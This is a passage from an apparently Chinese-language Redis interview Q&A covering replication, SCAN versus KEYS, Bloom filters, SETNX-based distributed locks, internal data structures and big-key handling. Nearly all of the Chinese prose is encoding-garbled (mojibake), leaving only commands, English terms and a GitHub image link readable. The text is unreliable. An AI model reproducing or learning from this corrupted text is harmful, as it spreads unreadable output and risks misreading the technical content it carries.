2. **å¦‚æœæ•°æ®æ¯”è¾ƒå…³é”®ï¼ŒæŸä¸ªSlaveå¼€å¯AOFå¤‡ä»½æ•°æ®ï¼Œç­–ç•¥ä¸ºæ¯ç§’åŒæ­¥ä¸€æ¬¡**ã€‚
3. ä¸ºäº†ä¸»ä»å¤åˆ¶çš„é€Ÿåº¦å’Œè¿æ¥çš„ç¨³å®šæ€§ï¼ŒSlaveå’ŒMasteræœ€å¥½åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…ã€‚
4. å°½é‡é¿å…åœ¨å‹åŠ›è¾ƒå¤§çš„ä¸»åº“ä¸Šå¢åŠ ä»åº“
5. Masterè°ƒç”¨BGREWRITEAOFé‡å†™AOFæ–‡ä»¶ï¼ŒAOFåœ¨é‡å†™çš„æ—¶å€™ä¼šå å¤§é‡çš„CPUå’Œå†…å­˜èµ„æºï¼Œå¯¼è‡´æœåŠ¡loadè¿‡é«˜ï¼Œå‡ºç°çŸ­æš‚æœåŠ¡æš‚åœç°è±¡ã€‚
6. ä¸ºäº†Masterçš„ç¨³å®šæ€§ï¼Œä¸»ä»å¤åˆ¶ä¸è¦ç”¨å›¾çŠ¶ç»“æ„ï¼Œç”¨å•å‘é“¾è¡¨ç»“æ„æ›´ç¨³å®šï¼Œå³ä¸»ä»å…³ç³»ä¸ºï¼šMaster<â€“Slave1<â€“Slave2<â€“Slave3â€¦ï¼Œè¿™æ ·çš„ç»“æ„ä¹Ÿæ–¹ä¾¿è§£å†³å•ç‚¹æ•…éšœé—®é¢˜ï¼Œå®ç°Slaveå¯¹Masterçš„æ›¿æ¢ï¼Œä¹Ÿå³ï¼Œå¦‚æœMasteræŒ‚äº†ï¼Œå¯ä»¥ç«‹é©¬å¯ç”¨Slave1åšMasterï¼Œå…¶ä»–ä¸å˜ã€‚

## å‡å¦‚Redisæœ‰ä¸€äº¿ä¸ªkeyï¼Œå…¶ä¸­10ä¸‡ä¸ªkeyä»¥æŸä¸ªå›ºå®šçš„å·²çŸ¥å‰ç¼€å¼€å¤´ï¼Œå¦‚ä½•æŠŠä»–ä»¬éƒ½æ‰¾å‡ºæ¥ï¼Ÿ

**keys**æŒ‡ä»¤å¯ä»¥æ‰«æå¾—å‡ºæŒ‡å®šæ¨¡å¼çš„keyåˆ—è¡¨

ä½†æ˜¯é—®é¢˜æ˜¯ç”±äº`redis`æ˜¯å•çº¿ç¨‹çš„ï¼Œ**keysæŒ‡ä»¤ä¼šå¯¼è‡´çº¿ç¨‹é˜»å¡ä¸€æ®µæ—¶é—´**ï¼Œæ­¤æ—¶çš„çº¿ä¸ŠæœåŠ¡ä¼šæœ‰çŸ­æš‚åœé¡¿ç›´åˆ°keysæŒ‡ä»¤æ‰§è¡Œå®Œæ¯•ã€‚

ä½¿ç”¨**scan**æŒ‡ä»¤å¯ä»¥åšåˆ°**æ— é˜»å¡**çš„æå–å‡ºæŒ‡å®šæ¨¡å¼çš„keyåˆ—è¡¨ã€‚ä½†æœ‰ä¸€å®šçš„é‡å¤å‡ ç‡ã€‚å†åšä¸€éå»é‡å°±ğŸ†—ã€‚

## å¸ƒéš†è¿‡æ»¤å™¨äº†è§£å—ï¼Ÿ

**è§£å†³ç¼“å­˜ç©¿é€çš„é—®é¢˜ã€‚**

æ˜¯`redis`ä¸­çš„ä¸€ç§æ•°æ®ç»“æ„ï¼Œå®ƒå°†MySQLæ•°æ®åº“ä¸­æ‰€æœ‰å¯èƒ½å­˜åœ¨çš„æ•°æ®éƒ½ç¼“å­˜åˆ°å¸ƒéš†è¿‡æ»¤å™¨ä¸­ã€‚å½“æ”»å‡»è€…è®¿é—®ä¸å­˜åœ¨çš„æ•°æ®æ—¶**è¿…é€Ÿè¿”å›**é¿å…è¯·æ±‚æ‰“åˆ°æ•°æ®åº“ä¸Šå¯¼è‡´æ•°æ®åº“å®•æœºé—®é¢˜ã€‚

**åŸç†ï¼š**

Bloom Filter æ˜¯ä¸€ç§ç©ºé—´æ•ˆç‡å¾ˆé«˜çš„**éšæœºæ•°æ®ç»“æ„**ï¼ŒBloom filter å¯ä»¥çœ‹åšæ˜¯å¯¹ bit-map çš„æ‰©å±•ã€‚å½“ä¸€ä¸ªå…ƒç´ è¢«åŠ å…¥é›†åˆæ—¶ï¼Œé€šè¿‡ **K ä¸ª Hash å‡½æ•°**å°†è¿™ä¸ªå…ƒç´ æ˜ å°„æˆä¸€ä¸ªä½é˜µåˆ—ï¼ˆBit arrayï¼‰ä¸­çš„ K ä¸ªç‚¹ï¼ŒæŠŠå®ƒä»¬ç½®ä¸º 1ã€‚ æ£€ç´¢æ—¶ï¼Œæˆ‘ä»¬åªè¦çœ‹çœ‹è¿™äº›ç‚¹æ˜¯ä¸æ˜¯éƒ½æ˜¯ 1 å°±ï¼ˆå¤§çº¦ï¼‰çŸ¥é“é›†åˆä¸­æœ‰æ²¡æœ‰å®ƒã€‚ **å€¼å¾—æ³¨æ„çš„æ˜¯**ï¼šå¦‚æœè¿™äº›ç‚¹æœ‰ä»»ä½•ä¸€ä¸ª 0ï¼Œåˆ™è¢«æ£€ç´¢å…ƒç´ ä¸€å®šä¸åœ¨ã€‚ å¦‚æœéƒ½æ˜¯ 1ï¼Œåˆ™è¢«æ£€ç´¢å…ƒç´ å¾ˆå¯èƒ½åœ¨ã€‚

## å¸ƒéš†è¿‡æ»¤å™¨çš„ä¼˜ã€ç¼ºç‚¹ï¼Ÿ

**äºŒã€ä¼˜ç‚¹**

**ç©ºé—´æ•ˆç‡**å’Œ**æŸ¥è¯¢æ•ˆç‡**éƒ½è¿œè¿œè¶…è¿‡ä¸€èˆ¬çš„ç®—æ³•ï¼Œå¸ƒéš†è¿‡æ»¤å™¨å­˜å‚¨ç©ºé—´å’Œæ’å…¥ / æŸ¥è¯¢æ—¶é—´éƒ½æ˜¯å¸¸æ•°O(k)ã€‚ å¦å¤–, æ•£åˆ—å‡½æ•°ç›¸äº’ä¹‹é—´æ²¡æœ‰å…³ç³»ï¼Œæ–¹ä¾¿ç”±ç¡¬ä»¶å¹¶è¡Œå®ç°ã€‚ **å¸ƒéš†è¿‡æ»¤å™¨ä¸éœ€è¦å­˜å‚¨å…ƒç´ æœ¬èº«ï¼Œåœ¨æŸäº›å¯¹ä¿å¯†è¦æ±‚éå¸¸ä¸¥æ ¼çš„åœºåˆæœ‰ä¼˜åŠ¿ã€‚**

**ä¸‰ã€ç¼ºç‚¹**

å¸ƒéš†è¿‡æ»¤å™¨çš„ç¼ºç‚¹å’Œä¼˜ç‚¹ä¸€æ ·æ˜æ˜¾ã€‚ **è¯¯ç®—ç‡**æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚éšç€å­˜å…¥çš„å…ƒç´ æ•°é‡å¢åŠ ï¼Œè¯¯ç®—ç‡éšä¹‹å¢åŠ ã€‚ä½†æ˜¯å¦‚æœå…ƒç´ æ•°é‡å¤ªå°‘ï¼Œåˆ™ä½¿ç”¨æ•£åˆ—è¡¨å°±å¯ä»¥ã€‚ å¦å¤–ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸èƒ½ä»å¸ƒéš†è¿‡æ»¤å™¨ä¸­åˆ é™¤å…ƒç´ . æˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°æŠŠä½æ•°ç»„å˜æˆæ•´æ•°æ•°ç»„ï¼Œæ¯æ’å…¥ä¸€ä¸ªå…ƒç´ ç›¸åº”çš„è®¡æ•°å™¨åŠ  1, è¿™æ ·åˆ é™¤å…ƒç´ æ—¶å°†è®¡æ•°å™¨å‡æ‰å°±å¯ä»¥äº†ã€‚ç„¶è€Œè¦ä¿è¯å®‰å…¨åœ°åˆ é™¤å…ƒç´ å¹¶éå¦‚æ­¤ç®€å•ã€‚é¦–å…ˆæˆ‘ä»¬å¿…é¡»ä¿è¯åˆ é™¤çš„å…ƒç´ çš„ç¡®åœ¨å¸ƒéš†è¿‡æ»¤å™¨é‡Œé¢ã€‚è¿™ä¸€ç‚¹å•å‡­è¿™ä¸ªè¿‡æ»¤å™¨æ˜¯æ— æ³•ä¿è¯çš„ã€‚å¦å¤–è®¡æ•°å™¨å›ç»•ä¹Ÿä¼šé€ æˆé—®é¢˜ã€‚

## redisåˆ†å¸ƒå¼é”å®ç°åŸç†ï¼Ÿ

1. ä¸€ä¸ªçº¿ç¨‹å°è¯•å»è·å–é”lockï¼Œé€šè¿‡`setnx`(lockï¼Œ`uuid`ï¼Œè¿‡æœŸæ—¶é—´)ã€‚å¦‚æœlockä¸å­˜åœ¨å°±ä¼šè®¾ç½®æˆåŠŸï¼Œè¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚
2. è·å–åˆ†å¸ƒå¼é”æˆåŠŸä¹‹åï¼Œéœ€è¦ä½¿ç”¨`expire`å‘½ä»¤è®¾ç½®é”æœ‰æ•ˆæœŸï¼Œé˜²æ­¢æ­»é”ã€‚
3. æ‰§è¡Œç›¸å…³ä¸šåŠ¡é€»è¾‘
4. é‡Šæ”¾é”ï¼Œé¦–å…ˆè·å–åˆ°lockå¯¹åº”çš„valueï¼Œå°†æ­¤valueä¸`uuid`å¯¹æ¯”ï¼Œå¦‚æœç›¸åŒçš„è¯æ‰§è¡ŒdeleteæŒ‡ä»¤åˆ é™¤é”ã€‚æ³¨æ„ï¼ä¸Šè¿°ä¸¤ä¸ªæ­¥éª¤éœ€è¦ä¿è¯**åŸå­æ€§**ã€‚éœ€è¦ä½¿ç”¨`lua`è„šæœ¬ã€‚

## Redisé’ˆå¯¹æ•°æ®ç»“æ„åšäº†å“ªäº›ä¼˜åŒ–ï¼Ÿ

redisæ•°æ®æ¨¡å‹ï¼š

åœ¨Redisä¸­ï¼Œä¼šç»™æ¯ä¸€ä¸ªkey-valueé”®å€¼å¯¹åˆ†é…ä¸€ä¸ªå­—å…¸å®ä½“ï¼Œå°±æ˜¯`dicEntry`ã€‚`dicEntry`åŒ…å«ä¸‰éƒ¨åˆ†ï¼š **keyçš„æŒ‡é’ˆã€valçš„æŒ‡é’ˆã€nextæŒ‡é’ˆ**ï¼ŒnextæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªdicteEntryå½¢æˆé“¾è¡¨ï¼Œè¿™ä¸ªnextæŒ‡é’ˆå¯ä»¥å°†å¤šä¸ªå“ˆå¸Œå€¼ç›¸åŒçš„é”®å€¼å¯¹é“¾æ¥åœ¨ä¸€èµ·ï¼Œ**é€šè¿‡é“¾åœ°å€æ³•æ¥è§£å†³å“ˆå¸Œå†²çªçš„é—®é¢˜**

[![img](https://github.com/lokles/Web-Development-Interview-With-Java/raw/main/images/redis%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B.png)](https://github.com/lokles/Web-Development-Interview-With-Java/blob/main/images/redisæ•°æ®æ¨¡å‹.png)

- **sds** ï¼š**Simple Dynamic String**ï¼Œç®€å•åŠ¨æ€å­—ç¬¦ä¸²ï¼Œå­˜å‚¨å­—ç¬¦ä¸²æ•°æ®ã€‚
- **redisObject**ï¼šRedisçš„5ç§å¸¸ç”¨ç±»å‹éƒ½æ˜¯ä»¥RedisObjectæ¥å­˜å‚¨çš„ï¼ŒredisObjectä¸­çš„**type**å­—æ®µæŒ‡æ˜äº†å€¼çš„æ•°æ®ç±»å‹ï¼ˆä¹Ÿå°±æ˜¯5ç§åŸºæœ¬ç±»å‹)ã€‚**ptr**å­—æ®µæŒ‡å‘å¯¹è±¡æ‰€åœ¨çš„åœ°å€ã€‚

1ã€Stringï¼š sdså®ç°ï¼Œè‡ªå®šä¹‰ç±»å‹åŠ å…¥äº†é•¿åº¦ï¼Œæ¯æ¬¡è·å–å­—ç¬¦ä¸²é•¿åº¦çš„æ—¶é—´å¤æ‚åº¦å°±æ˜¯O(1)ï¼Œè€Œåˆ©ç”¨lenå’Œfreeå±æ€§å¯¹è¿½åŠ å­—ç¬¦ä¸²è¿›è¡Œä¼˜åŒ–ï¼Œä¹Ÿå¯ä»¥é™ä½é‡æ–°åˆ†é…å†…å­˜çš„æ¬¡æ•°ã€‚

2ã€Hashï¼š zip-list æˆ–è€… hash-tableï¼ˆæ•°ç»„+é“¾è¡¨ï¼‰æ‰©å®¹æœºåˆ¶é‡‡ç”¨æ¸è¿›å¼æ‰©å®¹ã€‚

3ã€Setï¼š int-Set

4ã€Zsetï¼š skip-list

4ã€Listï¼š zip-list -> linked-list -> quick-list ï¼ˆå‰ä¸¤è€…åˆå¹¶ä¹‹ååˆ›å»ºäº†å¿«é€Ÿé“¾è¡¨ï¼‰

## redisæ˜¯å¦‚ä½•ä¿è¯åŸå­æ“ä½œçš„ï¼Ÿ

Redisæ˜¯å•çº¿ç¨‹çš„ã€‚åœ¨å•çº¿ç¨‹ç¨‹åºä¸­ï¼Œä»»åŠ¡ä¸€ä¸ªä¸€ä¸ªåœ°åšï¼Œå¿…é¡»åšå®Œä¸€ä¸ªä»»åŠ¡åï¼Œæ‰ä¼šå»åšå¦ä¸€ä¸ªä»»åŠ¡ã€‚å› è€Œredisçš„æ“ä½œä¿è¯äº†åŸå­æ€§ã€‚

## ä»€ä¹ˆå‘½ä»¤ä¼šè§¦å‘å†™RDBæ–‡ä»¶ï¼Ÿ

BGSAVEï¼šåå°å¤„ç†ï¼Œä¸ä¼šé˜»å¡å·¥ä½œçº¿ç¨‹ã€‚

SAVEï¼šä¼šå¯¼è‡´å·¥ä½œçº¿ç¨‹çš„é˜»å¡ã€‚

## çŸ¥é“å¤§Keyé—®é¢˜å—ï¼Ÿ

ç”±äºRedisä¸»çº¿ç¨‹ä¸ºå•çº¿ç¨‹æ¨¡å‹ï¼Œå¤§keyä¹Ÿä¼šå¸¦æ¥ä¸€äº›é—®é¢˜ï¼Œå¦‚ï¼š

1. é›†ç¾¤æ¨¡å¼åœ¨slotåˆ†ç‰‡å‡åŒ€æƒ…å†µä¸‹ï¼Œä¼šå‡ºç°æ•°æ®å’ŒæŸ¥è¯¢å€¾æ–œæƒ…å†µï¼Œéƒ¨åˆ†æœ‰å¤§keyçš„RedisèŠ‚ç‚¹å ç”¨å†…å­˜å¤šï¼ŒQPSé«˜ã€‚
2. å¤§keyç›¸å…³çš„åˆ é™¤æˆ–è€…è‡ªåŠ¨è¿‡æœŸæ—¶ï¼Œä¼šå‡ºç°qpsçªé™æˆ–è€…çªå‡çš„æƒ…å†µï¼Œæç«¯æƒ…å†µä¸‹ï¼Œä¼šé€ æˆä¸»ä»å¤åˆ¶å¼‚å¸¸ï¼ŒRedisæœåŠ¡é˜»å¡æ— æ³•å“åº”è¯·æ±‚ã€‚

**redis4.0ä¹‹å‰çš„å¤§keyçš„å‘ç°ä¸åˆ é™¤æ–¹æ³•**

- `redis-rdb-tools`å·¥å…·ã€‚`redis`å®ä¾‹ä¸Šæ‰§è¡Œ`bgsave`ï¼Œç„¶åå¯¹ç”Ÿæˆçš„`rdb`æ–‡ä»¶è¿›è¡Œåˆ†æï¼Œæ‰¾åˆ°å…¶ä¸­çš„å¤§KEYã€‚
- `redis-cli --bigkeys`å‘½ä»¤ã€‚å¯ä»¥æ‰¾åˆ°æŸä¸ªå®ä¾‹5ç§æ•°æ®ç±»å‹(Stringã€hashã€listã€setã€zset)çš„æœ€å¤§keyã€‚

ç”±äºåœ¨redis4.0å‰ï¼Œæ²¡æœ‰**lazy free**æœºåˆ¶ï¼›é’ˆå¯¹æ‰«æå‡ºæ¥çš„å¤§keyï¼ŒDBAåªèƒ½é€šè¿‡hscanã€sscanã€zscanæ–¹å¼æ¸è¿›åˆ é™¤è‹¥å¹²ä¸ªå…ƒç´ ï¼Œä½†é¢å¯¹è¿‡æœŸé”®åˆ é™¤çš„åœºæ™¯ï¼Œè¿™ç§å–å·§çš„åˆ é™¤å°±æ— èƒ½ä¸ºåŠ›ã€‚æˆ‘ä»¬åªèƒ½ç¥ˆç¥·è‡ªåŠ¨æ¸…ç†è¿‡æœŸkeyåˆšå¥½åœ¨ç³»ç»Ÿä½å³°æ—¶ï¼Œé™ä½å¯¹ä¸šåŠ¡çš„å½±å“ã€‚

**Redis 4.0ä¹‹åçš„å¤§keyçš„å‘ç°ä¸åˆ é™¤æ–¹æ³•**

Redis 4.0å¼•å…¥äº†memory usageå‘½ä»¤å’Œlazy freeæœºåˆ¶ï¼Œä¸ç®¡æ˜¯å¯¹å¤§keyçš„å‘ç°ï¼Œè¿˜æ˜¯è§£å†³å¤§keyåˆ é™¤æˆ–è€…è¿‡æœŸé€ æˆçš„é˜»å¡é—®é¢˜éƒ½æœ‰æ˜æ˜¾çš„æå‡ã€‚